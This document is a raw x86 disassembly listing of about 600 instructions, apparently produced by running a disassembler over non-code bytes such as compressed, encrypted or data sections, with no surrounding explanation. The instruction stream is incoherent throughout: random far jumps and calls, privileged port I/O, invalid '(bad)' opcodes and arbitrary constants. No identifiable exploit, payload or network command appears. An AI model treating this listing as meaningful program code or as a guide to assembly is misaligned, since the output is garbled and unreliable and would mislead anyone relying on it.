  41e9ae:	xor    ah,bh
  41e9b0:	lock mov eax,0xa20cc6d9
  41e9b6:	mov    ah,0x12
  41e9b8:	mov    BYTE PTR [ebp-0x76],0xca
  41e9bc:	xchg   DWORD PTR [edi],edi
  41e9be:	nop
  41e9bf:	push   cs
  41e9c0:	pop    ebp
  41e9c1:	jge    0x41e951
  41e9c3:	pusha  
  41e9c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9c5:	fild   DWORD PTR [esi-0x1a]
  41e9c8:	mov    BYTE PTR [ecx-0x4],dl
  41e9cb:	dec    eax
  41e9cc:	jno    0x41ea05
  41e9ce:	add    ch,al
  41e9d0:	mov    es,ebp
  41e9d2:	mov    esp,0xb8f5c094
  41e9d7:	stos   DWORD PTR es:[edi],eax
  41e9d8:	mov    ds:0xde9075d6,al
  41e9dd:	jecxz  0x41ea1b
  41e9df:	imul   ebp,eax,0xffffffc3
  41e9e2:	fstp   QWORD PTR [edi-0x71]
  41e9e5:	sbb    cl,BYTE PTR [edi-0x188ec698]
  41e9eb:	pop    edi
  41e9ec:	retf   0x5ec
  41e9ef:	shl    BYTE PTR [edx],0x3c
  41e9f2:	sbb    cl,BYTE PTR [ebx]
  41e9f4:	push   0xcdf7d390
  41e9f9:	lods   eax,DWORD PTR ds:[esi]
  41e9fa:	fst    DWORD PTR [edi+0x64]
  41e9fd:	xor    BYTE PTR [edx],dl
  41e9ff:	imul   edx,esp,0xbba124d7
  41ea05:	pop    ebp
  41ea06:	stos   DWORD PTR es:[edi],eax
  41ea07:	jecxz  0x41e9c8
  41ea09:	add    BYTE PTR [edx-0x80],0x36
  41ea0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea0e:	push   edi
  41ea0f:	loop   0x41e9cc
  41ea11:	out    0x7f,al
  41ea13:	mov    dl,0xf7
  41ea15:	jmp    0x683b:0xf67ba1ca
  41ea1c:	cli    
  41ea1d:	mov    cl,0x55
  41ea1f:	js     0x41ea12
  41ea21:	out    dx,al
  41ea22:	sbb    BYTE PTR [ebp+0xaaf1764],ah
  41ea28:	adc    esp,DWORD PTR [eiz*1-0x4b58b641]
  41ea2f:	popa   
  41ea30:	retf   
  41ea31:	aas    
  41ea32:	rcr    DWORD PTR [ecx],cl
  41ea34:	int    0xab
  41ea36:	test   al,0x87
  41ea38:	push   cs
  41ea39:	cli    
  41ea3a:	xor    DWORD PTR [ebx-0x4d2a1087],edi
  41ea40:	(bad)  
  41ea41:	sysexit 
  41ea43:	les    ecx,FWORD PTR [ebp+0x20640418]
  41ea49:	aaa    
  41ea4a:	ret    0x7c6b
  41ea4d:	xchg   edx,eax
  41ea4e:	pop    ebp
  41ea4f:	push   ebx
  41ea50:	cs pop edx
  41ea52:	cld    
  41ea53:	inc    esp
  41ea54:	add    bh,BYTE PTR [ebx+0x37]
  41ea57:	and    eax,0xbfd34236
  41ea5c:	adc    eax,0xca010f8c
  41ea61:	xchg   ebp,eax
  41ea62:	jb     0x41eab8
  41ea64:	scas   al,BYTE PTR es:[edi]
  41ea65:	pop    edx
  41ea66:	int    0x80
  41ea68:	cmc    
  41ea69:	(bad)  
  41ea6a:	fisttp QWORD PTR [esi-0x2b]
  41ea6d:	sub    eax,0x3a54624b
  41ea72:	push   ebx
  41ea73:	sub    BYTE PTR [eax],ah
  41ea75:	jmp    0x834422b1
  41ea7a:	imul   ecx,DWORD PTR [edx+ebp*1+0x2d],0x6
  41ea7f:	or     al,0x8e
  41ea81:	(bad)
  41ea84:	test   BYTE PTR [ecx-0x23],bh
  41ea87:	mov    esi,0x8a8e581f
  41ea8c:	clc    
  41ea8d:	mov    dl,BYTE PTR [edi+ebx*8-0x36]
  41ea91:	fsubr  st(5),st
  41ea93:	inc    eax
  41ea94:	mov    cl,0x44
  41ea96:	arpl   WORD PTR [eax-0x78],bp
  41ea99:	pop    eax
  41ea9a:	ins    DWORD PTR es:[edi],dx
  41ea9b:	scas   al,BYTE PTR es:[edi]
  41ea9c:	fdivr  DWORD PTR [edi+0x4ad4b755]
  41eaa2:	pop    ds
  41eaa3:	jno    0x41eb1d
	...
  41eab1:	jle    0x41ea75
  41eab3:	in     al,dx
  41eab4:	push   cs
  41eab5:	cld    
  41eab6:	cs (bad) 
  41eab8:	repnz lods eax,DWORD PTR ds:[esi]
  41eaba:	add    BYTE PTR [eax],bl
  41eabc:	xor    al,0x37
  41eabe:	cmc    
  41eabf:	mov    ecx,0x165d58b
  41eac4:	add    BYTE PTR [ebx+eax*1-0x6c4f0000],ch
  41eacb:	int3   
  41eacc:	pop    es
  41eacd:	das    
  41eace:	shl    DWORD PTR [edx-0x125235e3],cl
  41ead4:	cs cdq 
  41ead6:	clc    
  41ead7:	and    dl,bh
  41ead9:	ds pop esp
  41eadb:	and    BYTE PTR [ecx-0x3bce6a83],bh
  41eae1:	shr    BYTE PTR [ebp-0x85a0dee],1
  41eae7:	adc    DWORD PTR [ecx+0x5a6ef4f0],esi
  41eaed:	add    eax,0xb104a64e
  41eaf2:	sub    BYTE PTR [ebp-0x72],0xe
  41eaf6:	fidiv  DWORD PTR [esi]
  41eaf8:	test   ecx,edi
  41eafa:	ja     0x41eb39
  41eafc:	inc    esp
  41eafd:	pop    esp
  41eafe:	mov    edx,0x9136b8dc
  41eb03:	(bad)  
  41eb04:	ror    DWORD PTR [esi],0xcc
  41eb07:	lds    ebp,FWORD PTR [ecx]
  41eb09:	adc    ah,BYTE PTR es:[esi+eax*8]
  41eb0d:	mov    ebx,0x49771848
  41eb12:	mov    ch,0x10
  41eb14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb15:	lods   eax,DWORD PTR ds:[esi]
  41eb16:	cmp    ebx,ebx
  41eb18:	rcl    BYTE PTR [eax],0x5a
  41eb1b:	std    
  41eb1c:	dec    edi
  41eb1d:	inc    edi
  41eb1e:	neg    DWORD PTR [eax+eax*2-0x60]
  41eb22:	shl    bh,1
  41eb24:	sub    BYTE PTR [ebp+0x64373588],0xdf
  41eb2b:	cdq    
  41eb2c:	adc    bh,BYTE PTR [esi-0x37f16365]
  41eb32:	mov    ds:0xcb121e1a,eax
  41eb37:	int3   
  41eb38:	pop    es
  41eb39:	push   esi
  41eb3a:	push   cs
  41eb3b:	add    bl,BYTE PTR [esi-0x130a6d45]
  41eb41:	xchg   ebp,eax
  41eb42:	nop
  41eb43:	jb     0x41eaf6
  41eb45:	xor    ch,BYTE PTR [ecx+0x4626659f]
  41eb4b:	ret    0x8160
  41eb4e:	jmp    0x41eae4
  41eb50:	mov    eax,0x970c00f0
  41eb55:	popf   
  41eb56:	pop    es
  41eb57:	(bad)  
  41eb58:	jns    0x41eae1
  41eb5a:	jge    0x41eb48
  41eb5c:	inc    ecx
  41eb5d:	fadd   DWORD PTR [ebp+ecx*4+0x3db46fa]
  41eb64:	aad    0xe2
  41eb66:	mov    al,0xa
  41eb68:	dec    edx
  41eb69:	push   0x46aef718
  41eb6e:	jmp    0x17c9:0x60e1a122
  41eb75:	jmp    0xaf21032f
  41eb7a:	or     DWORD PTR ds:0xae622d64,esp
  41eb80:	adc    al,0x85
  41eb82:	scas   al,BYTE PTR es:[edi]
  41eb83:	mov    ah,0xd7
  41eb85:	mov    edx,0x40f164db
  41eb8a:	jl     0x41eb96
  41eb8c:	pop    edx
  41eb8d:	mov    eax,0xce8782e4
  41eb92:	call   0xc530:0x576aa0ea
  41eb99:	aas    
  41eb9a:	stc    
  41eb9b:	push   ebp
  41eb9c:	cs das 
  41eb9e:	gs mov dh,0x13
  41eba1:	add    ah,BYTE PTR [eax-0x5eda6670]
  41eba7:	cdq    
  41eba8:	mov    bh,0xd
  41ebaa:	mov    edx,DWORD PTR [esi+0x6bf65ca6]
  41ebb0:	sub    DWORD PTR [ebx],esi
  41ebb2:	out    0x9e,eax
  41ebb4:	pop    esp
  41ebb5:	dec    eax
  41ebb6:	push   es
  41ebb7:	cld    
  41ebb8:	(bad)  
  41ebb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebba:	dec    edx
  41ebbb:	repnz mov bl,0xf4
  41ebbe:	scas   eax,DWORD PTR es:[edi]
  41ebbf:	sti    
  41ebc0:	push   cs
  41ebc1:	push   ds
  41ebc2:	inc    esi
  41ebc3:	shl    BYTE PTR [ebx+ecx*8],1
  41ebc6:	aam    0x7a
  41ebc8:	arpl   WORD PTR [eax],ax
  41ebca:	mov    bl,0x3e
  41ebcc:	rcl    cl,0x79
  41ebcf:	and    dh,0x31
  41ebd2:	sub    eax,0x175b0404
  41ebd7:	adc    esi,esi
  41ebd9:	cmp    DWORD PTR [ebx],esp
  41ebdb:	or     DWORD PTR ds:0xb18ca7cd,0x7d
  41ebe2:	mov    dh,0x35
  41ebe4:	xchg   ebp,eax
  41ebe5:	push   ecx
  41ebe6:	ss lock out 0xcd,eax
  41ebea:	push   0xbc986bc2
  41ebef:	in     al,0xef
  41ebf1:	fwait
  41ebf2:	arpl   WORD PTR [edx+0x79069755],dx
  41ebf8:	pop    edi
  41ebf9:	fwait
  41ebfa:	or     al,0xe3
  41ebfc:	sub    al,0x92
  41ebfe:	ja     0x41ec2a
  41ec00:	fidivr DWORD PTR [edi]
  41ec02:	adc    DWORD PTR [esi],eax
  41ec04:	mov    eax,ds:0x132e26be
  41ec09:	in     eax,0x70
  41ec0b:	cmp    eax,0xc3804cbc
  41ec10:	retf   
  41ec11:	ja     0x41ec0c
  41ec13:	jg     0x41ec33
  41ec15:	pop    es
  41ec16:	loop   0x41ebec
  41ec18:	std    
  41ec19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec1a:	cmovg  edi,DWORD PTR [eax]
  41ec1d:	mov    esi,0xfa0438c1
  41ec22:	adc    edi,DWORD PTR [edx+eiz*8+0x5a]
  41ec26:	add    eax,0x34847e08
  41ec2b:	aaa    
  41ec2c:	and    ecx,edx
  41ec2e:	stc    
  41ec2f:	mov    cl,0x15
  41ec31:	cmp    edx,eax
  41ec33:	jo     0x41ebd6
  41ec35:	xlat   BYTE PTR ds:[ebx]
  41ec36:	sbb    ebx,DWORD PTR [esi-0x8]
  41ec39:	div    DWORD PTR [edx+0x671da820]
  41ec3f:	daa    
  41ec40:	xchg   BYTE PTR [esi-0x30],ah
  41ec43:	push   0x31
  41ec45:	neg    DWORD PTR [ecx+0x7110c435]
  41ec4b:	test   eax,0x9235cfd0
  41ec50:	fisub  DWORD PTR [edx]
  41ec52:	out    0xdd,eax
  41ec54:	lea    edi,[ebx-0x3adc5c2c]
  41ec5a:	cs stos DWORD PTR es:[edi],eax
  41ec5c:	sbb    DWORD PTR [edi],ecx
  41ec5e:	pop    ebx
  41ec5f:	pop    edx
  41ec60:	push   ecx
  41ec61:	test   BYTE PTR [edi+0x7a],ch
  41ec64:	and    ah,BYTE PTR [ebx+ecx*1+0x7b54bc38]
  41ec6b:	ins    DWORD PTR es:[edi],dx
  41ec6c:	leave  
  41ec6d:	les    ecx,FWORD PTR [ebp+ebp*4-0x69238df8]
  41ec74:	add    ch,BYTE PTR [ebx-0x59]
  41ec77:	in     al,dx
  41ec78:	les    esp,FWORD PTR [ebx+0x22]
  41ec7b:	jl     0x41ec3d
  41ec7d:	adc    al,0x1e
  41ec7f:	call   0x1b541ab6
  41ec84:	ds pop edi
  41ec86:	es jbe 0x41ec4e
  41ec89:	outs   dx,DWORD PTR ds:[esi]
  41ec8a:	pushf  
  41ec8b:	jbe    0x41ecc8
  41ec8d:	icebp  
  41ec8e:	shl    DWORD PTR [edi],0x9d
  41ec91:	test   eax,0x6ae2a8ee
  41ec96:	jecxz  0x41ed04
  41ec98:	fs int3 
  41ec9a:	stos   BYTE PTR es:[edi],al
  41ec9b:	mov    cl,0x78
  41ec9d:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41ec9f:	mov    al,0x5a
  41eca1:	sbb    bl,BYTE PTR [edx+ebp*4+0x5d]
  41eca5:	mov    ebp,0xadc2ce28
  41ecaa:	jmp    0x41ece5
  41ecac:	jno    0x41ed1f
  41ecae:	xchg   edi,eax
  41ecaf:	int3   
  41ecb0:	shl    BYTE PTR [ecx+ecx*8-0x41],cl
  41ecb4:	jo     0x41ec5a
  41ecb6:	adc    eax,0x15812114
  41ecbb:	inc    esp
  41ecbc:	pop    ecx
  41ecbd:	xor    dh,al
  41ecbf:	pop    ebx
  41ecc0:	mov    al,ds:0x69a72f8d
  41ecc5:	fwait
  41ecc6:	test   eax,0xf47778f8
  41eccb:	fs inc edx
  41eccd:	xlat   BYTE PTR ds:[ebx]
  41ecce:	mov    al,0xbb
  41ecd0:	rcr    BYTE PTR [esi-0x4ff2a057],0x53
  41ecd7:	mov    edi,0x533d1f9c
  41ecdc:	test   DWORD PTR [edx+0x1c],esi
  41ecdf:	shr    BYTE PTR ds:0xdf3e17c,0xc9
  41ece6:	(bad)  
  41ece7:	aad    0x6
  41ece9:	add    eax,0xd3750043
  41ecee:	xchg   DWORD PTR [eax+0x3a],ebx
  41ecf1:	cdq    
  41ecf2:	push   es
  41ecf3:	out    dx,eax
  41ecf4:	jno    0x41ed3a
  41ecf6:	inc    ebp
  41ecf7:	inc    edx
  41ecf8:	pop    ecx
  41ecf9:	(bad)  
  41ecfa:	sub    esp,DWORD PTR [edx+ebp*2-0x4cc6ae94]
  41ed01:	xchg   esp,eax
  41ed02:	pop    ebx
  41ed03:	fs inc eax
  41ed05:	cmp    BYTE PTR [esi+ebp*1-0x3],0x74
  41ed0a:	adc    BYTE PTR [ecx],ch
  41ed0c:	lock and bl,BYTE PTR [edi-0xd]
  41ed10:	mov    ds:0x6565138e,al
  41ed15:	inc    ebx
  41ed16:	xchg   DWORD PTR [ebp-0x70558084],edx
  41ed1c:	pop    ss
  41ed1d:	fs scas al,BYTE PTR es:[edi]
  41ed1f:	nop
  41ed20:	xor    ebx,0x732c1193
  41ed26:	or     eax,esi
  41ed28:	mov    ch,BYTE PTR [edx+0x27cc4430]
  41ed2e:	xchg   esi,edi
  41ed30:	int    0xea
  41ed32:	jg     0x41ed52
  41ed34:	jmp    0x126adbe9
  41ed39:	xor    ecx,DWORD PTR [ecx-0x17]
  41ed3c:	out    dx,al
  41ed3d:	js     0x41ecd9
  41ed3f:	and    DWORD PTR [eax+edi*8+0x33],0xc58298a2
  41ed47:	mov    ds:0x46ffc47,al
  41ed4c:	sbb    al,BYTE PTR [ebx]
  41ed4e:	dec    ebx
  41ed4f:	retf   0xbca5
  41ed52:	mov    edi,DWORD PTR [ebx-0x6dcd10]
  41ed58:	arpl   WORD PTR [ecx+edi*1-0x76d4f199],ax
  41ed5f:	repnz xchg ebx,eax
  41ed61:	xchg   ecx,eax
  41ed62:	sbb    edi,esi
  41ed64:	pop    esp
  41ed65:	inc    eax
  41ed66:	xchg   BYTE PTR gs:[ecx+eax*4],cl
  41ed6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed6b:	dec    ebx
  41ed6c:	push   ebx
  41ed6d:	aaa    
  41ed6e:	test   al,0x43
  41ed70:	test   BYTE PTR [edx+0x68715a64],0xb4
  41ed77:	mov    edi,0x44deeb9c
  41ed7c:	xor    dl,bl
  41ed7e:	test   eax,0xd173cf00
  41ed83:	cwde   
  41ed84:	or     bh,dl
  41ed86:	sbb    BYTE PTR [edi+0x27],0xaa
  41ed8a:	xor    eax,0x64750498
  41ed8f:	jg     0x41ed54
  41ed91:	add    ecx,edx
  41ed93:	mov    ebx,fs
  41ed95:	mov    esp,0xcf7987bb
  41ed9a:	bound  esp,QWORD PTR [edx+0x644a112]
  41eda0:	dec    ecx
  41eda1:	jns    0x41edb1
  41eda3:	pop    es
  41eda4:	jb     0x41ed81
  41eda6:	ror    DWORD PTR [ebx+eiz*2+0x3e872cce],1
  41edad:	sbb    edi,DWORD PTR [edi-0x5f]
  41edb0:	in     al,0x49
  41edb2:	adc    eax,0x12e70f7
  41edb7:	lods   al,BYTE PTR ds:[esi]
  41edb8:	jo     0x41ed83
  41edba:	ss out 0x58,eax
  41edbd:	mov    edx,esp
  41edbf:	invd   
  41edc1:	(bad)  
  41edc2:	stos   DWORD PTR es:[edi],eax
  41edc3:	dec    ecx
  41edc4:	call   DWORD PTR [ebp+0x3c]
  41edc7:	lds    edx,FWORD PTR [edx-0x10]
  41edca:	retf   
  41edcb:	inc    edx
  41edcc:	loopne 0x41ee08
  41edce:	fisubr DWORD PTR [edi]
  41edd0:	das    
  41edd1:	push   0xfffffff4
  41edd3:	popa   
  41edd4:	push   edx
  41edd5:	mov    bl,0x7
  41edd7:	in     al,0x79
  41edd9:	add    al,0x7c
  41eddb:	xor    eax,0x62f540b9
  41ede0:	mov    bl,0x64
  41ede2:	js     0x41ee39
  41ede4:	fidiv  DWORD PTR [ebx+0x7f6b044]
  41edea:	cli    
  41edeb:	push   esp
  41edec:	adc    BYTE PTR [ebp+0x572f4eb9],0xd
  41edf3:	cmp    DWORD PTR [edi+0x64765af1],edx
  41edf9:	retf   
  41edfa:	mov    eax,ds:0x6396772a
  41edff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee00:	retf   0x26cc
  41ee03:	sahf   
  41ee04:	adc    eax,0xf5606046
  41ee09:	test   BYTE PTR [bx+di+0x47],0xf6
  41ee0e:	les    edx,FWORD PTR [esp+eiz*4-0x22]
  41ee12:	or     BYTE PTR [ebx],cl
  41ee14:	fmul   st(5),st
  41ee16:	add    ecx,DWORD PTR [esi+0x334f93c9]
  41ee1c:	imul   edx,ecx,0x888c3122
  41ee22:	pop    ecx
  41ee23:	outs   dx,DWORD PTR ds:[esi]
  41ee24:	dec    edx
  41ee25:	jnp    0x41ee19
  41ee27:	outs   dx,BYTE PTR ds:[esi]
  41ee28:	lods   al,BYTE PTR ds:[esi]
  41ee29:	data16 js 0x41ee0f
  41ee2c:	lea    edi,[ebx-0x4]
  41ee2f:	jge    0x41ee09
  41ee31:	mov    ebx,0x84535e0
  41ee36:	cmp    al,BYTE PTR [ebp+ecx*8+0x5c]
  41ee3a:	adc    al,0x5d
  41ee3c:	xchg   ebx,eax
  41ee3d:	sbb    eax,0x75d8a83f
  41ee42:	mov    fs:0x737995e7,eax
  41ee48:	dec    esi
  41ee49:	push   esi
  41ee4a:	(bad)  
  41ee4b:	mov    al,ds:0xf519a37c
  41ee50:	aaa    
  41ee51:	and    eax,0x78c13e11
  41ee56:	mov    ds:0xed318b46,eax
  41ee5b:	jg     0x41eeb1
  41ee5d:	sbb    BYTE PTR es:[ebx-0x39],ch
  41ee61:	xor    DWORD PTR [ebp-0x6d],eax
  41ee64:	ins    DWORD PTR es:[edi],dx
  41ee65:	sbb    ebp,DWORD PTR [esi]
  41ee67:	pop    esi
  41ee68:	or     DWORD PTR [ecx-0x4f],edx
  41ee6b:	mov    ds:0xaae515d2,eax
  41ee70:	sub    ebp,ebx
  41ee72:	and    DWORD PTR [ecx+0x71],edi
	...
  41ee80:	add    BYTE PTR [esi-0x37],cl
  41ee83:	(bad)  [edi+ebx*8+0x5c]
  41ee87:	(bad)  
  41ee89:	mov    al,ds:0x4a2f76e4
  41ee8e:	mov    ebx,0x698101bf
  41ee93:	add    DWORD PTR [eax],eax
  41ee95:	lods   al,BYTE PTR ds:[esi]
  41ee96:	add    eax,DWORD PTR [eax]
  41ee98:	add    dl,bh
  41ee9a:	dec    esp
  41ee9b:	loop   0x41ef08
  41ee9d:	loop   0x41ef0c
  41ee9f:	je     0x41ee74
  41eea1:	mov    edi,0x759e70cf
  41eea6:	jl     0x41eee6
  41eea8:	sbb    BYTE PTR [edx],dh
  41eeaa:	mov    ss:0x84985f3f,al
  41eeb0:	std    
  41eeb1:	ds dec esi
  41eeb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeb4:	les    esi,FWORD PTR [esi+ecx*2+0x7]
  41eeb8:	test   al,dh
  41eeba:	mov    esp,0x5c6c90c0
  41eebf:	adc    BYTE PTR [esp+ecx*8-0x62],0x2d
  41eec4:	jmp    0x1ee6:0x98c514c
  41eecb:	dec    ebp
  41eecc:	in     al,0x29
  41eece:	iret   
  41eecf:	movntq (bad),mm5
  41eed0:	out    0xef,eax
  41eed2:	or     esi,DWORD PTR [eax-0x64]
  41eed5:	cwde   
  41eed6:	mov    dh,0xce
  41eed8:	or     BYTE PTR [ecx+0x68],0x52
  41eedc:	sub    al,0x69
  41eede:	and    eax,0x8bde3d9e
  41eee3:	pop    es
  41eee4:	sbb    al,0xb7
  41eee6:	out    dx,eax
  41eee7:	ins    DWORD PTR es:[edi],dx
  41eee8:	popa   
  41eee9:	dec    ebx
  41eeea:	xor    DWORD PTR [eax-0x78],esp
  41eeed:	dec    eax
  41eeee:	mov    bh,0x7b
  41eef0:	xchg   edi,eax
  41eef1:	push   es
  41eef2:	loope  0x41ef56
  41eef4:	fimul  DWORD PTR [eax-0x5f]
  41eef7:	fs dec esi
  41eef9:	fdiv   DWORD PTR [ecx+0x2925f474]
  41eeff:	inc    ebp
  41ef00:	sub    bh,ch
  41ef02:	imul   ebp,DWORD PTR [ebx],0xffffffc2
  41ef05:	and    DWORD PTR [esi-0x13],0x857ade05
  41ef0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef0e:	test   al,0xa6
  41ef10:	push   cs
  41ef11:	pop    esi
  41ef12:	outs   dx,BYTE PTR ds:[esi]
  41ef13:	aas    
  41ef14:	lds    esi,FWORD PTR [ecx-0x3855d7d7]
  41ef1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef1b:	test   eax,0xc646dcaa
  41ef20:	pop    edi
  41ef21:	out    0x41,al
  41ef23:	mov    bh,0xe6
  41ef25:	dec    ebx
  41ef26:	js     0x41ef80
  41ef28:	ins    BYTE PTR es:[edi],dx
  41ef29:	inc    esp
  41ef2b:	dec    eax
  41ef2c:	test   BYTE PTR [ebx+0x220af502],bh
  41ef32:	es sub al,0x88
  41ef35:	xchg   DWORD PTR [ecx-0x2b],eax
  41ef38:	sbb    ebp,ebx
  41ef3a:	or     dh,BYTE PTR [ebp-0x39f25c40]
  41ef40:	xchg   esp,eax
  41ef41:	inc    ebx
  41ef42:	xor    al,BYTE PTR ds:0x4ff4f33a
  41ef48:	ins    DWORD PTR es:[edi],dx
  41ef49:	cmc    
  41ef4a:	and    esi,DWORD PTR [eax]
  41ef4c:	fst    DWORD PTR [ecx]
  41ef4e:	push   es
  41ef4f:	mov    ?,WORD PTR [edi]
  41ef51:	xlat   BYTE PTR ds:[ebx]
  41ef52:	pop    esi
  41ef53:	push   cs
  41ef54:	adc    DWORD PTR [edx+0x4cae50fb],edx
  41ef5a:	mov    dl,BYTE PTR [eax+0x16]
  41ef5d:	out    0x52,al
  41ef5f:	sub    DWORD PTR [eax],eax
  41ef61:	mov    ds:0xa6dc2395,eax
  41ef66:	push   ebp
  41ef67:	test   al,0x28
  41ef69:	fld    DWORD PTR [ebp-0x38]
  41ef6c:	jl     0x41efd5
  41ef6e:	mov    edx,0x2377f15f
  41ef73:	cli    
  41ef74:	and    DWORD PTR [eax+0x72],esi
  41ef77:	xchg   edi,eax
  41ef78:	adc    eax,0xeb9405fd
  41ef7d:	jae    0x41ef76
  41ef7f:	push   eax
  41ef80:	cdq    
  41ef81:	inc    edx
  41ef82:	xchg   edi,eax
  41ef83:	test   edx,eax
  41ef85:	sbb    ebx,DWORD PTR [esp+ebp*8]
  41ef88:	call   0x39a6:0x596423c0
  41ef8f:	test   DWORD PTR [edx+0x13bf1308],esi
  41ef95:	or     eax,DWORD PTR ds:0x94d94031
  41ef9b:	enter  0x96d5,0xe5
  41ef9f:	cmp    BYTE PTR [ecx+0xb],0x49
  41efa3:	sar    BYTE PTR [ebx+eiz*1+0x13],0x33
  41efa8:	cmp    al,0xc3
  41efaa:	jecxz  0x41efe9
  41efac:	sbb    esi,esi
  41efae:	adc    BYTE PTR [ebp+edx*4+0x56ad3a93],bl
  41efb5:	cmp    ebp,ecx
  41efb7:	add    BYTE PTR [edi+0x75],bl
  41efba:	pop    ss
  41efbb:	xchg   ebx,eax
  41efbc:	and    DWORD PTR [ecx-0x6d305228],ebp
  41efc2:	stc    
  41efc3:	pop    edx
  41efc4:	jns    0x41efcc
  41efc6:	sub    ch,bh
  41efc8:	mov    ah,dh
  41efca:	fild   DWORD PTR [eax+edi*1+0x6c]
  41efce:	add    ch,bh
  41efd0:	data16 fisub DWORD PTR ds:0x636b4e6
  41efd7:	mov    ebx,0x5fbb553f
  41efdc:	pop    ss
  41efdd:	fucomp st(3)
  41efdf:	jecxz  0x41ef7a
  41efe1:	and    al,0x9f
  41efe3:	icebp  
  41efe4:	test   DWORD PTR [edi+0x18e33526],0xf67c0e8a
  41efee:	jl     0x41f000
  41eff0:	push   es
  41eff1:	ja     0x41f043
  41eff3:	pop    es
  41eff4:	addr16 out dx,al
  41eff6:	pop    eax
  41eff7:	(bad)  
  41eff8:	cmp    al,0x58
  41effa:	push   cs
  41effb:	jg     0x41ef8b
  41effd:	push   eax
  41effe:	xor    ebp,DWORD PTR [edx+0x1a370bff]
  41f004:	and    eax,0x689866aa
  41f009:	and    al,0xab
  41f00b:	dec    ebx
  41f00c:	xchg   esp,eax
  41f00d:	xchg   ebx,eax
  41f00e:	sahf   
  41f00f:	(bad)  
  41f010:	aad    0x5f
  41f012:	sahf   
  41f013:	sbb    eax,0x59e9b3e3
  41f018:	or     ah,BYTE PTR [eax-0x6f]
  41f01b:	ret    
  41f01c:	popf   
  41f01d:	xlat   BYTE PTR ds:[ebx]
  41f01e:	adc    ecx,0xe1acd920
  41f024:	xchg   ebp,eax
  41f025:	push   edi
  41f026:	mov    eax,ds:0x35b76824
  41f02b:	popa   
  41f02c:	stc    
  41f02d:	sub    BYTE PTR [ebx+0x446cae5c],ch
  41f033:	ds (bad) 
  41f035:	aad    0x19
  41f037:	mov    cl,0xa7
  41f039:	or     esi,DWORD PTR [esi+0x556adac3]
  41f03f:	push   esi
  41f040:	shl    DWORD PTR [ebx-0x4],1
  41f043:	sbb    BYTE PTR [edi-0x4beaca02],cl
  41f049:	inc    eax
  41f04a:	sub    edx,DWORD PTR [edx+0x66b96b3a]
  41f050:	in     eax,0xf
  41f052:	stos   DWORD PTR es:[edi],eax
  41f053:	xchg   edx,eax
  41f054:	xchg   edx,eax
  41f055:	mov    esi,0x66c8c5c7
  41f05a:	aas    
  41f05b:	ss retf 
  41f05d:	mov    edi,0x3697f2b6
  41f062:	add    DWORD PTR [edx+0x32],esi
  41f065:	inc    esi
  41f066:	jp     0x41f08c
  41f068:	xchg   ebp,eax
  41f069:	push   es
  41f06a:	jp     0x41f03f
  41f06c:	push   ebx
  41f06d:	enter  0x9dbc,0x72
  41f071:	xchg   ebp,ebp
  41f073:	jae    0x41f0a7
  41f075:	cmp    dh,BYTE PTR [edx+0xe]
  41f078:	lds    ebx,FWORD PTR [edi+edx*2+0x46a61eeb]
  41f07f:	jg     0x41f046
  41f081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f082:	imul   DWORD PTR [ebx-0x4d]
  41f085:	jmp    0x41f0ff
  41f087:	aad    0x82
  41f089:	outs   dx,DWORD PTR ds:[esi]
  41f08a:	dec    ebx
  41f08b:	push   es
  41f08c:	sub    eax,0xed1a8eb2
  41f091:	dec    ebp
  41f092:	fadd   DWORD PTR [eax+0x60]
  41f095:	xlat   BYTE PTR gs:[ebx]
  41f097:	pop    esi
  41f098:	adc    eax,0x2e30817
  41f09d:	das    
  41f09e:	sbb    bl,ah
  41f0a0:	mov    dh,0x9f
  41f0a2:	push   ebx
  41f0a3:	jp     0x41f11a
  41f0a5:	gs popf 
  41f0a7:	mov    ah,0x69
  41f0a9:	stc    
  41f0aa:	mov    eax,0x3bee9362
  41f0af:	arpl   WORD PTR [edi+0x22],cx
  41f0b2:	dec    ebx
  41f0b3:	adc    BYTE PTR [esi-0x20a14914],dl
  41f0b9:	push   es
  41f0ba:	outs   dx,BYTE PTR ds:[esi]
  41f0bb:	cmp    cl,BYTE PTR [edi-0x47]
  41f0be:	push   ds
  41f0bf:	fist   DWORD PTR [edi-0x12cc3981]
  41f0c5:	popa   
  41f0c6:	mov    BYTE PTR [eax+0xa],bl
  41f0c9:	aas    
  41f0ca:	xchg   esp,eax
  41f0cb:	fld    QWORD PTR [edi]
  41f0cd:	xchg   edx,eax
  41f0ce:	fistp  QWORD PTR [ebx-0x44]
  41f0d1:	outs   dx,DWORD PTR ds:[esi]
  41f0d2:	push   0x39db7fd6
  41f0d7:	sub    al,0x4
  41f0d9:	(bad)  
  41f0da:	rcr    BYTE PTR [eax-0x5122a70a],0xba
  41f0e1:	ins    BYTE PTR es:[edi],dx
  41f0e2:	jp     0x41f10d
  41f0e4:	xchg   esi,eax
  41f0e5:	sbb    esp,eax
  41f0e7:	cdq    
  41f0e8:	loope  0x41f0ab
  41f0ea:	jno    0x41f14c
  41f0ec:	mov    al,0xe5
  41f0ee:	popf   
  41f0ef:	xor    dl,BYTE PTR ds:0x2ba1b26d
  41f0f5:	jmp    0xbb48:0x1d5088f2
  41f0fc:	into   
  41f0fd:	mov    edi,0xf82f1ce3
  41f102:	mov    ebp,0x116c249a
  41f107:	in     eax,0xf3
  41f109:	jecxz  0x41f0e2
  41f10b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f10c:	or     ch,dh
  41f10e:	jbe    0x41f0a8
  41f110:	mov    edx,0xc2f400fb
  41f115:	push   ebx
  41f116:	pop    ebp
  41f117:	pushf  
  41f118:	push   ds
  41f119:	inc    edx
  41f11b:	add    ebx,eax
  41f11d:	or     al,0xd3
  41f11f:	xor    ecx,edi
